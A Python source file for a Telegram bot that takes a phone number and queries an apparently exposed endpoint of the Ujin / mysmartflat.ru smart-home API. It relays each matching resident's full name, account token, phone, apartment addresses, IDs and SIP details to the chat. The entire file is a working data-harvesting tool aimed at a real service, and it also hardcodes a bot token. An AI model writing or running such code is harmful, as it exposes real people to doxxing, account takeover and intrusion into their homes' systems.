import telebot
import requests

bot = telebot.TeleBot('5321021406:AAGFKeWH3wtTHXs7FVG44WbLLKYs84RAXkk')

@bot.message_handler(commands=['help'])
def description(message):
    bot.send_message(message.chat.id, "Я могу вывести информацию о пользователях Ujin по номеру телефона")


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Привет ' + message.from_user.first_name + ', я знаю все про пользоватей Ujin)))')


@bot.message_handler(func=lambda message: True)
def give_number(message):
    number = message.text
    request_info_user = requests.get(
        f'https://api-product.mysmartflat.ru/api/script/getuserdatafromphonenumber/?phone={number}')
    response = request_info_user
    response = response.json()
    i = 0
    x = 0
    for i in range(len(response)):
        try:
            provider_info = response[i]["provider"]

            user_name = response[i]["data"]["user"]["user_fullname"]
            user_token = response[i]["token"]
            number_info = response[i]["data"]["user"]["user_phone"]
            bot.send_message(message.chat.id, f'Провайдер: {provider_info}\nФио: {user_name}\nТокен: {user_token}\nТелефон: {number_info}')
            try:
                for x in range(len(response[i]["data"]["user"]["apartment"])):
                    adres = response[i]["data"]["user"]["apartment"][x]["title"]
                    appartment_id = response[i]["data"]["user"]["apartment"][x]["id"]
                    sip_info = response[i]["data"]["user"]["apartment"][x]["sip"]
                    complex_id = response[i]["data"]["user"]["apartment"][x]["complex_id"]
                    building_id = response[i]["data"]["user"]["apartment"][x]["building_id"]
                    bot.send_message(message.chat.id, f'Адрес: {adres}\nAppartment_id: {appartment_id}\nSip: {sip_info}\nComplex_id: {complex_id}\nBuilding_id: {building_id}')
                    x += 1

            except IndexError:
                bot.send_message(message.chat.id, "Квартиры для этого аккаунта закончились")
                x = 0

        except KeyError:
            bot.send_message(message.chat.id, 'Нет квартиры')


bot.polling(none_stop=True)


